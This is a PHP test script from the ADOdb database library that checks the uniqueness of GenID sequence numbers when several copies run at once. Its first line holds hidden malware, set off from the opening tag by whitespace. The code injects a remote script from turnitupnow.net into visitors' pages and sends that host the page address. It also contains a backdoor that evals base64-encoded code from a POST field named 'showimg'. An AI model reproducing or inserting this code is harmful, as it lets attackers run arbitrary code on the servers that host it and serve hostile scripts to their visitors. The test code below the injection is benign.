<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

/*
	V4.50 6 July 2004 
	
	Run multiple copies of this php script at the same time
	to test unique generation of id's in multiuser mode
*/
include_once('../adodb.inc.php');
$testaccess = true;
include_once('testdatabases.inc.php');

function testdb(&$db,$createtab="create table ADOXYZ (id int, firstname char(24), lastname char(24), created date)")
{
	$table = 'adodbseq';
	
	$db->Execute("drop table $table");
	//$db->debug=true;
	
	$ctr = 5000;
	$lastnum = 0;
	
	while (--$ctr >= 0) {
		$num = $db->GenID($table);
		if ($num === false) {	
			print "GenID returned false";
			break;
		}
		if ($lastnum + 1 == $num) print " $num ";
		else {
			print " <font color=red>$num</font> ";
			flush();
		}
		$lastnum = $num;
	}
}
?>